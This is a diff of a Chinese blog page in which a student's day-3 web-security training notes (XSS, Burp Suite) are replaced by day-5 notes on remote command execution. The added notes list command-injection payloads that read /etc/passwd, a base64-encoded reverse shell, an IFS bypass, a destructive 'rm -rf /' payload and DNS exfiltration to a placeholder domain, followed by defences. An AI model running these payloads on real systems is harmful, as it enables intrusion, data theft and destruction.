@@ -4,14 +4,16 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="&#39;实训记录3&#39;, 计算机视觉、QRCODE">
-    <meta name="description" content="Web安全学习日志 - 第三天今日学习目标
-掌握XSS漏洞的原理与分类
-熟悉Burp Suite工具的基础操作
-理解HTTP&amp;#x2F;HTTPS协议的安全差异
-学习XSS攻击的Payload构造与利用
+    <meta name="keywords" content="&#39;实训记录5&#39;, 计算机视觉、QRCODE">
+    <meta name="description" content="Web安全学习日志 - 第五天今日学习目标
+掌握RCE漏洞的原理与分类
+理解命令执行与代码执行的区别
+学习RCE攻击的Payload构造与利用
+熟悉反弹Shell的实现方法
+了解RCE漏洞的防御策略
 
-一、XSS漏洞深度解析1. 漏洞原">
+一、RCE漏洞核心概念1. 定义
+远程">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -23,7 +25,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>&#39;实训记录3&#39; | zoyager的博客</title>
+    <title>&#39;实训记录5&#39; | zoyager的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -331,12 +333,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">&#39;实训记录3&#39;</h1>
+                    <h1 class="description center-align post-title">&#39;实训记录5&#39;</h1>
                 </div>
             </div>
         </div>
@@ -372,7 +374,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2025-03-26
+                    2025-03-28
                 </div>
                 
 
@@ -386,7 +388,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    687
+                    1.1k
                 </div>
                 
 
@@ -411,140 +413,138 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Web安全学习日志-第三天"><a href="#Web安全学习日志-第三天" class="headerlink" title="Web安全学习日志 - 第三天"></a>Web安全学习日志 - 第三天</h1><h3 id="今日学习目标"><a href="#今日学习目标" class="headerlink" title="今日学习目标"></a><strong>今日学习目标</strong></h3><ol>
-<li>掌握XSS漏洞的原理与分类</li>
-<li>熟悉Burp Suite工具的基础操作</li>
-<li>理解HTTP&#x2F;HTTPS协议的安全差异</li>
-<li>学习XSS攻击的Payload构造与利用</li>
+                <h1 id="Web安全学习日志-第五天"><a href="#Web安全学习日志-第五天" class="headerlink" title="Web安全学习日志 - 第五天"></a>Web安全学习日志 - 第五天</h1><h3 id="今日学习目标"><a href="#今日学习目标" class="headerlink" title="今日学习目标"></a><strong>今日学习目标</strong></h3><ol>
+<li>掌握RCE漏洞的原理与分类</li>
+<li>理解命令执行与代码执行的区别</li>
+<li>学习RCE攻击的Payload构造与利用</li>
+<li>熟悉反弹Shell的实现方法</li>
+<li>了解RCE漏洞的防御策略</li>
 </ol>
-<h3 id="一、XSS漏洞深度解析"><a href="#一、XSS漏洞深度解析" class="headerlink" title="一、XSS漏洞深度解析"></a><strong>一、XSS漏洞深度解析</strong></h3><h4 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1. 漏洞原理"></a><strong>1. 漏洞原理</strong></h4><ul>
-<li><strong>定义</strong>：跨站脚本攻击（Cross-Site Scripting），攻击者注入恶意JavaScript代码，突破同源策略。</li>
-<li><strong>核心条件</strong>：<ol>
-<li>用户输入的数据未被过滤直接输出到页面</li>
-<li>浏览器执行了恶意脚本（如<code>&lt;script&gt;</code>标签）</li>
-</ol>
-</li>
+<h3 id="一、RCE漏洞核心概念"><a href="#一、RCE漏洞核心概念" class="headerlink" title="一、RCE漏洞核心概念"></a><strong>一、RCE漏洞核心概念</strong></h3><h4 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a><strong>1. 定义</strong></h4><ul>
+<li><strong>远程命令执行（RCE）</strong>：攻击者通过网络远程执行目标服务器的系统命令。</li>
+<li><strong>远程代码执行（RCE）</strong>：攻击者远程执行目标服务器的任意代码（如PHP、Python）。</li>
+</ul>
+<h4 id="2-核心危害"><a href="#2-核心危害" class="headerlink" title="2. 核心危害"></a><strong>2. 核心危害</strong></h4><ul>
+<li><strong>权限控制</strong>：获取服务器管理员权限（Root&#x2F;Administrator）。</li>
+<li><strong>数据窃取</strong>：读取敏感文件（如数据库配置、用户密码）。</li>
+<li><strong>横向渗透</strong>：以内网服务器为跳板进一步攻击。</li>
+</ul>
+<h3 id="二、RCE漏洞原理与分类"><a href="#二、RCE漏洞原理与分类" class="headerlink" title="二、RCE漏洞原理与分类"></a><strong>二、RCE漏洞原理与分类</strong></h3><h4 id="1-漏洞成因"><a href="#1-漏洞成因" class="headerlink" title="1. 漏洞成因"></a><strong>1. 漏洞成因</strong></h4><ul>
+<li><strong>未过滤的用户输入</strong>：参数直接拼接到系统命令或代码执行函数中。</li>
+<li><strong>危险函数调用</strong>：使用<code>system()</code>、<code>exec()</code>、<code>eval()</code>等函数时未做安全校验。</li>
 </ul>
 <h4 id="2-漏洞分类"><a href="#2-漏洞分类" class="headerlink" title="2. 漏洞分类"></a><strong>2. 漏洞分类</strong></h4><table>
 <thead>
 <tr>
 <th>类型</th>
 <th>触发条件</th>
-<th>危害程度</th>
+<th>示例语言</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><strong>反射型</strong></td>
-<td>用户输入的数据在响应中直接输出（如搜索框结果）</td>
-<td>★★★☆</td>
+<td><strong>命令执行</strong></td>
+<td>用户输入拼接到<code>system()</code>、<code>shell_exec()</code>等系统命令函数</td>
+<td>PHP、Python</td>
 </tr>
 <tr>
-<td><strong>存储型</strong></td>
-<td>用户输入的数据存储在数据库，后续被其他用户访问（如论坛评论）</td>
-<td>★★★★★</td>
-</tr>
-<tr>
-<td><strong>DOM型</strong></td>
-<td>JavaScript通过DOM操作动态生成内容（如<code>innerHTML</code>）</td>
-<td>★★★☆</td>
+<td><strong>代码执行</strong></td>
+<td>用户输入拼接到<code>eval()</code>、<code>compile()</code>等代码执行函数</td>
+<td>PHP、Java</td>
 </tr>
 </tbody></table>
-<h4 id="3-攻击Payload示例"><a href="#3-攻击Payload示例" class="headerlink" title="3. 攻击Payload示例"></a><strong>3. 攻击Payload示例</strong></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="二、Burp-Suite-基础操作"><a href="#二、Burp-Suite-基础操作" class="headerlink" title="二、Burp Suite 基础操作"></a><strong>二、Burp Suite 基础操作</strong></h3><h4 id="1-工具介绍"><a href="#1-工具介绍" class="headerlink" title="1. 工具介绍"></a><strong>1. 工具介绍</strong></h4><ul>
-<li><strong>功能</strong>：抓包、改包、漏洞扫描、暴力破解</li>
-<li><strong>版本</strong>：社区版（免费）、专业版（付费）</li>
-<li><strong>依赖</strong>：Java 环境，需配置 JRE 路径</li>
-</ul>
-<h4 id="2-核心模块"><a href="#2-核心模块" class="headerlink" title="2. 核心模块"></a><strong>2. 核心模块</strong></h4><table>
+<h4 id="3-操作系统差异"><a href="#3-操作系统差异" class="headerlink" title="3. 操作系统差异"></a><strong>3. 操作系统差异</strong></h4><table>
 <thead>
 <tr>
-<th>模块</th>
-<th>用途</th>
+<th>系统</th>
+<th>命令分隔符</th>
+<th>目录列表命令</th>
+<th>路径符号</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><strong>Proxy</strong></td>
-<td>拦截 HTTP&#x2F;HTTPS 请求，修改数据包</td>
+<td>Linux</td>
+<td><code>;</code>&#x2F;<code>&amp;</code></td>
+<td><code>ls</code></td>
+<td><code>/</code></td>
 </tr>
 <tr>
-<td><strong>Scanner</strong></td>
-<td>自动化漏洞检测（如 XSS、SQL 注入）</td>
-</tr>
-<tr>
-<td><strong>Repeater</strong></td>
-<td>手动重发请求，调试 Payload</td>
-</tr>
-<tr>
-<td><strong>Intruder</strong></td>
-<td>暴力破解（如密码枚举、参数爆破）</td>
+<td>Windows</td>
+<td><code>&amp;</code>&#x2F;<code>&amp;&amp;</code></td>
+<td><code>dir</code></td>
+<td><code>\</code></td>
 </tr>
 </tbody></table>
-<h4 id="3-HTTPS-配置"><a href="#3-HTTPS-配置" class="headerlink" title="3. HTTPS 配置"></a><strong>3. HTTPS 配置</strong></h4><ol>
-<li><p><strong>生成证书</strong>：Burp 自带 CA 证书（<code>http://burp</code>下载）</p>
-</li>
-<li><p>浏览器导入</p>
-<p>：</p>
-<ul>
-<li>Chrome：设置 → 隐私与安全 → 安全 → 管理证书 → 导入</li>
-<li>Firefox：选项 → 隐私与安全 → 证书 → 查看证书 → 导入</li>
-</ul>
-</li>
-</ol>
-<h3 id="三、HTTP-与-HTTPS-协议对比"><a href="#三、HTTP-与-HTTPS-协议对比" class="headerlink" title="三、HTTP 与 HTTPS 协议对比"></a><strong>三、HTTP 与 HTTPS 协议对比</strong></h3><h4 id="1-核心区别"><a href="#1-核心区别" class="headerlink" title="1. 核心区别"></a><strong>1. 核心区别</strong></h4><table>
+<h3 id="三、RCE攻击Payload构造"><a href="#三、RCE攻击Payload构造" class="headerlink" title="三、RCE攻击Payload构造"></a><strong>三、RCE攻击Payload构造</strong></h3><h4 id="1-基础Payload示例"><a href="#1-基础Payload示例" class="headerlink" title="1. 基础Payload示例"></a><strong>1. 基础Payload示例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux</span></span><br><span class="line">127.0.0.1; <span class="built_in">ls</span> /etc</span><br><span class="line">127.0.0.1 &amp; <span class="built_in">cat</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">127.0.0.1&amp;<span class="built_in">dir</span> c:\</span><br><span class="line">127.0.0.1&amp;&amp;<span class="built_in">type</span> c:\boot.ini</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-高级绕过技巧"><a href="#2-高级绕过技巧" class="headerlink" title="2. 高级绕过技巧"></a><strong>2. 高级绕过技巧</strong></h4><table>
 <thead>
 <tr>
-<th>协议</th>
-<th>安全性</th>
-<th>端口</th>
-<th>加密方式</th>
-<th>证书要求</th>
+<th>方法</th>
+<th>示例 Payload</th>
+<th>说明</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>HTTP</td>
-<td>不安全</td>
-<td>80</td>
-<td>明文传输</td>
-<td>无</td>
+<td><strong>编码绕过</strong></td>
+<td>&#96;127.0.0.1; echo ‘YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTk5OSAwPiYx’</td>
+<td>Base64 编码反弹 Shell 命令</td>
 </tr>
 <tr>
-<td>HTTPS</td>
-<td>安全</td>
-<td>443</td>
-<td>SSL&#x2F;TLS</td>
-<td>需要 CA 证书或自签名证书</td>
+<td><strong>符号绕过</strong></td>
+<td><code>127.0.0.1$&#123;IFS&#125;&amp;&amp;$&#123;IFS&#125;ls</code></td>
+<td>使用 IFS 环境变量绕过空格</td>
+</tr>
+<tr>
+<td><strong>条件竞争</strong></td>
+<td><code>127.0.0.1; sleep 10; rm -rf /</code></td>
+<td>延时执行破坏性命令</td>
 </tr>
 </tbody></table>
-<h4 id="2-证书作用"><a href="#2-证书作用" class="headerlink" title="2. 证书作用"></a><strong>2. 证书作用</strong></h4><ul>
-<li><strong>数据加密</strong>：防止中间人窃听</li>
-<li><strong>身份验证</strong>：验证服务器真实性</li>
-<li><strong>完整性校验</strong>：确保数据未被篡改</li>
+<h4 id="3-反弹-Shell"><a href="#3-反弹-Shell" class="headerlink" title="3. 反弹 Shell"></a><strong>3. 反弹 Shell</strong></h4><h3 id="四、RCE-漏洞利用场景"><a href="#四、RCE-漏洞利用场景" class="headerlink" title="四、RCE 漏洞利用场景"></a><strong>四、RCE 漏洞利用场景</strong></h3><h4 id="1-结合其他漏洞"><a href="#1-结合其他漏洞" class="headerlink" title="1. 结合其他漏洞"></a><strong>1. 结合其他漏洞</strong></h4><ul>
+<li><strong>文件上传漏洞</strong>：上传 Webshell 后通过 RCE 执行系统命令。</li>
+<li><strong>SSRF 漏洞</strong>：利用 RCE 触发内网服务探测（如 Redis 未授权访问）。</li>
 </ul>
-<h3 id="四、XSS-漏洞利用实战"><a href="#四、XSS-漏洞利用实战" class="headerlink" title="四、XSS 漏洞利用实战"></a><strong>四、XSS 漏洞利用实战</strong></h3><h4 id="1-反射型-XSS-测试"><a href="#1-反射型-XSS-测试" class="headerlink" title="1. 反射型 XSS 测试"></a><strong>1. 反射型 XSS 测试</strong></h4><ol>
-<li><strong>抓包</strong>：在 Burp Proxy 中拦截请求</li>
-<li><strong>插入 Payload</strong>：修改参数值为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
-<li><strong>发送请求</strong>：观察页面是否弹出警示框</li>
-</ol>
-<h4 id="2-DOM-型-XSS-利用"><a href="#2-DOM-型-XSS-利用" class="headerlink" title="2. DOM 型 XSS 利用"></a><strong>2. DOM 型 XSS 利用</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 漏洞代码示例（未过滤user参数）</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;output&quot;</span>).<span class="property">innerHTML</span> = <span class="built_in">decodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">split</span>(<span class="string">&#x27;user=&#x27;</span>)[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
-
-<p><strong>Payload</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/page.html?user=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="五、总结与明日计划"><a href="#五、总结与明日计划" class="headerlink" title="五、总结与明日计划"></a><strong>五、总结与明日计划</strong></h3><h4 id="1-今日重点"><a href="#1-今日重点" class="headerlink" title="1. 今日重点"></a><strong>1. 今日重点</strong></h4><ul>
-<li>XSS 漏洞的三种类型与利用场景</li>
-<li>Burp Suite 的基础配置与抓包改包</li>
-<li>HTTP&#x2F;HTTPS 协议的安全差异</li>
+<h4 id="2-无回显-RCE-利用"><a href="#2-无回显-RCE-利用" class="headerlink" title="2. 无回显 RCE 利用"></a><strong>2. 无回显 RCE 利用</strong></h4><ul>
+<li><strong>外带数据</strong>：通过 DNS 查询泄露数据（如<code>nslookup $(whoami).yourdomain.com</code>）。</li>
+<li><strong>文件写入</strong>：将结果写入可访问的文件（如<code>echo $(id) &gt; /var/www/html/output.txt</code>）。</li>
 </ul>
-<h1 id="web搭建"><a href="#web搭建" class="headerlink" title="web搭建"></a>web搭建</h1><p>安装小皮面板及phpcms</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326151344245.png" alt="image-20250326151344201"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326150756199.png" alt="image-20250326150755978"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326150819832.png" alt="image-20250326150819415"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326151308587.png" alt="image-20250326151308512"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326151255854.png" alt="image-20250326151255778"></p>
-<p>burpsuite抓登录管理员包</p>
+<h3 id="五、工具与实战"><a href="#五、工具与实战" class="headerlink" title="五、工具与实战"></a><strong>五、工具与实战</strong></h3><h4 id="1-漏洞利用工具"><a href="#1-漏洞利用工具" class="headerlink" title="1. 漏洞利用工具"></a><strong>1. 漏洞利用工具</strong></h4><ul>
+<li><strong>Metasploit</strong>：集成多个 RCE 漏洞模块（如<code>exploit/multi/http/tomcat_jsp_upload</code>）。</li>
+<li><strong>蚁剑</strong>：支持 RCE 漏洞生成与 Shell 管理。</li>
+<li><strong>Burp Suite</strong>：抓包分析并构造 Payload。</li>
+</ul>
+<h4 id="2-靶场推荐"><a href="#2-靶场推荐" class="headerlink" title="2. 靶场推荐"></a><strong>2. 靶场推荐</strong></h4><ul>
+<li><strong>Vulhub</strong>：RCE 漏洞专项靶场（如<code>vulhub/php/thinkphp_rce</code>）。</li>
+<li><strong>DVWA</strong>：高难度 RCE 模块（需手动构造 Payload）。</li>
+</ul>
+<h3 id="六、防御策略"><a href="#六、防御策略" class="headerlink" title="六、防御策略"></a><strong>六、防御策略</strong></h3><h4 id="1-代码层防御"><a href="#1-代码层防御" class="headerlink" title="1. 代码层防御"></a><strong>1. 代码层防御</strong></h4><ul>
+<li><strong>禁用危险函数</strong>：避免使用<code>system()</code>、<code>eval()</code>等函数。</li>
+<li><strong>输入过滤</strong>：使用白名单校验输入内容（如仅允许数字、字母）。</li>
+<li><strong>参数化查询</strong>：对数据库操作使用预编译语句。</li>
+</ul>
+<h4 id="2-系统层防御"><a href="#2-系统层防御" class="headerlink" title="2. 系统层防御"></a><strong>2. 系统层防御</strong></h4><ul>
+<li><strong>最小权限原则</strong>：限制 Web 服务用户权限（如禁止执行<code>rm</code>命令）。</li>
+<li><strong>安装 WAF</strong>：部署 Web 应用防火墙（如 ModSecurity）。</li>
+<li><strong>及时更新补丁</strong>：修复已知 RCE 漏洞（如 Log4j 2.x 漏洞）。</li>
+</ul>
+<h3 id="七、总结与明日计划"><a href="#七、总结与明日计划" class="headerlink" title="七、总结与明日计划"></a><strong>七、总结与明日计划</strong></h3><h4 id="1-今日重点"><a href="#1-今日重点" class="headerlink" title="1. 今日重点"></a><strong>1. 今日重点</strong></h4><ul>
+<li>RCE 漏洞的原理与分类</li>
+<li>Payload 构造与反弹 Shell 实现</li>
+<li>结合其他漏洞的利用方法</li>
+</ul>
+<h1 id="漏洞利用及RCE漏洞"><a href="#漏洞利用及RCE漏洞" class="headerlink" title="漏洞利用及RCE漏洞"></a>漏洞利用及RCE漏洞</h1><p>能够获取一些边界服务器当跳板机来进入网络环境</p>
+<h2 id="获取边界服务器的权限"><a href="#获取边界服务器的权限" class="headerlink" title="获取边界服务器的权限"></a>获取边界服务器的权限</h2><h3 id="通过web漏洞去获取权限（入侵类-逻辑类）"><a href="#通过web漏洞去获取权限（入侵类-逻辑类）" class="headerlink" title="通过web漏洞去获取权限（入侵类 逻辑类）"></a>通过web漏洞去获取权限（入侵类 逻辑类）</h3><p>文件上传 rce sql注入 ssrf</p>
+<p>0day 没有公开 厂商也没有打补丁的漏洞</p>
+<p>1day 没有公开 厂商打了补丁</p>
+<p>nday 公开 厂商打了漏洞</p>
+<h3 id="通过钓鱼获取"><a href="#通过钓鱼获取" class="headerlink" title="通过钓鱼获取"></a>通过钓鱼获取</h3><p>近源渗透  wifi渗透 sslvpn凭证 社会工程学</p>
+<h2 id="RCE漏洞（远程代码执行漏洞）"><a href="#RCE漏洞（远程代码执行漏洞）" class="headerlink" title="RCE漏洞（远程代码执行漏洞）"></a>RCE漏洞（远程代码执行漏洞）</h2><p>黑客可以在你的电脑上执行命令-&gt;电脑被控制</p>
+<p>渗透测试工程师-&gt;士兵</p>
+<p>漏洞及漏洞利用工具-&gt;武器</p>
+<p>安全开发工程师-&gt;造武器的</p>
+<p>安全研究员-&gt;挖漏洞的</p>
+<p>命令执行函数：shell_exec(),拼接漏洞</p>
+<p>漏洞原理：用户输入的参数没有进行严格的过滤，参数直接拼接到后端代码</p>
 
                 
             </div>
@@ -571,7 +571,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://zoyager.github.io/2025/03/26/shi-xun-ji-lu-3/">https://zoyager.github.io/2025/03/26/shi-xun-ji-lu-3/</a>
+                    <a href="https://zoyager.github.io/2025/03/28/shi-xun-ji-lu-5/">https://zoyager.github.io/2025/03/28/shi-xun-ji-lu-5/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -685,9 +685,48 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2025/03/28/shi-xun-ji-lu-5/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="&#39;实训记录5&#39;">
+                        
+                        <span class="card-title">&#39;实训记录5&#39;</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-03-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            zoyager.H
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2025/03/27/shi-xun-ji-lu-4/">
                     <div class="card-image">
@@ -705,45 +744,8 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-03-27
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            zoyager.H
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2025/03/25/shi-xun-ji-lu-2/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="&#39;实训记录2&#39;">
-                        
-                        <span class="card-title">&#39;实训记录2&#39;</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-03-25
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-03-27
                             </span>
                         <span class="publish-author">
                             
@@ -752,14 +754,6 @@
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Sql%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">Sql注入</span>
-                    </a>
-                    
                 </div>
                 
             </div>
